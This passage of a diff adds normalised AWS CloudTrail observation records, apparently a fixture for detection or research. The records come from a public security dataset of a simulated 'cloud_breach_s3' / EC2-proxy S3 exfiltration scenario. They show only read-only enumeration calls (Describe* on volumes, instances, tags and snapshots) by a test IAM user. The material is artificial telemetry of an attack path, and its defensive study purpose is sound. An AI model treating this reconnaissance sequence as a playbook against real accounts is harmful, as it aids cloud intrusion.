+            "event_id": "c2ea5356-3919-43de-8cec-0f2bbb83d33b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-bc2459ace02a0b55b220a32a",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:20.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "volumeSet": {},
+            "filterSet": {},
+            "maxResults": 1000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 6,
+            "event_id": "08995520-0ec9-4966-8ff5-22517e5a0a81"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4d7531ff21102d4dbe08b560",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:23.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceCreditSpecifications",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceCreditSpecificationsRequest": {
+              "InstanceId": {
+                "tag": 1,
+                "content": "i-044b1baf4c96e1b62"
+              }
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 7,
+            "event_id": "d346cbee-47c4-4ebe-b8d0-377b75861523"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-8a1d2cedfe0bfa51dc6fec19",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:20.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeHosts",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeHostsRequest": {
+              "MaxResults": 100
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 8,
+            "event_id": "5ac3e493-2666-4173-8514-f12b77eb147f"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-d49580fde38ec7f746e51219",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:20.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {},
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "16"
+                      }
+                    ]
+                  },
+                  "name": "instance-state-code"
+                }
+              ]
+            },
+            "maxResults": 1000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 9,
+            "event_id": "2537a6ac-5b7f-461e-a886-6541a8c58291"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-c421c7fccb6a575aac878836",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:22.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {},
+            "filterSet": {},
+            "maxResults": 100
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 10,
+            "event_id": "e7cf1dc4-7f77-45d0-968d-ba376307b4c7"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7326b6187d57dae8d2b917d8",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:21.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeLaunchTemplates",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeLaunchTemplatesRequest": {
+              "MaxResults": 1
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 11,
+            "event_id": "3403e605-0dc0-45de-a926-9a07386c2c36"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7f292f8db32403be1823179f",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:20.000Z",
+          "service": "elasticloadbalancing.amazonaws.com",
+          "operation": "DescribeLoadBalancers",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": null,
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 12,
+            "event_id": "ce9f76cc-8348-4b27-860b-8435f0e77881"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-37e39e5094b830f80a7d8a1d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:48.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeSnapshots",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "sharedUsersSet": {
+              "items": [
+                {
+                  "user": "self"
+                }
+              ]
+            },
+            "snapshotSet": {},
+            "ownersSet": {},
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 13,
+            "event_id": "c4f43c05-86df-46ae-9cf6-a62fab8b2d9c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-18b6c85039371d1bcec849b7",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1f"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 14,
+            "event_id": "d8fa1e48-d4ca-466a-9114-5f20f1940afa"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-283510bd429609386c4b4d23",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1b"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 15,
+            "event_id": "71700b54-b6cd-4a90-8e6c-e5e188bde594"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-9a22ca5b04e4d9eea6409a15",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1f"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 16,
+            "event_id": "950dd4fa-b004-405b-97fe-6898b9866ad7"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-16171dbb2c50bcbf975615be",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:30.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeTags",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "snapshot"
+                      }
+                    ]
+                  },
+                  "name": "resource-type"
+                }
+              ]
+            },
+            "maxResults": 10000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 17,
+            "event_id": "f63d3cf4-5246-4ae6-8da0-5824a317d1f0"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-1845edb828fbf138afbdb04e",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1e"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 18,
+            "event_id": "df57e2d9-44fe-4320-bd7c-1aee3a7dd7b2"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4a482d9889f5ef7c311cdf9b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1d"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 19,
+            "event_id": "f3526d90-b015-4a09-addc-8c745e0838af"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e22f4fb15ab2a9880f63c062",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1e"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 20,
+            "event_id": "97610454-719a-4904-8735-7590bc715f3c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-dcc1736e4bae6f03ed711320",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:30.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeTags",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "security-group"
+                      }
+                    ]
+                  },
+                  "name": "resource-type"
+                }
+              ]
+            },
+            "maxResults": 10000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 21,
+            "event_id": "0dfd94a8-7e4f-4f14-8b55-93810280aae8"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-58391e6e383000276c4f76d2",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:30.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeTags",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "image"
+                      }
+                    ]
+                  },
+                  "name": "resource-type"
+                }
+              ]
+            },
+            "maxResults": 10000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 22,
+            "event_id": "b33e9e63-9ad9-412b-8bcb-b509d3756ec6"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-705102763d1299a224ebbc7b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1a"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 23,
+            "event_id": "898658cd-ffee-4c5c-a504-ee2cec9a0cab"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-8eb18460dd05357e59d6ee73",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAvailabilityZones",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "availabilityZoneSet": {},
+            "availabilityZoneIdSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 24,
+            "event_id": "4bbed25d-843a-4ad9-811c-835e8067f1b8"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-96ce5109346eb0250ae47538",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeTags",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "instance"
+                      }
+                    ]
+                  },
+                  "name": "resource-type"
+                }
+              ]
+            },
+            "maxResults": 10000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 25,
+            "event_id": "069f5832-34bf-474b-af68-f46af1def90a"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0e02f9c4a87a869af5eb0895",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1b"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 26,
+            "event_id": "dfb94fa0-1a0b-4641-8f79-87e648dc1bde"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7f1eee2b1c17bd3086e3f1be",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1c"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 27,
+            "event_id": "46123a55-a05a-4795-81be-fcb0306e1486"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-2c76b577c8872ea14ae399c9",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
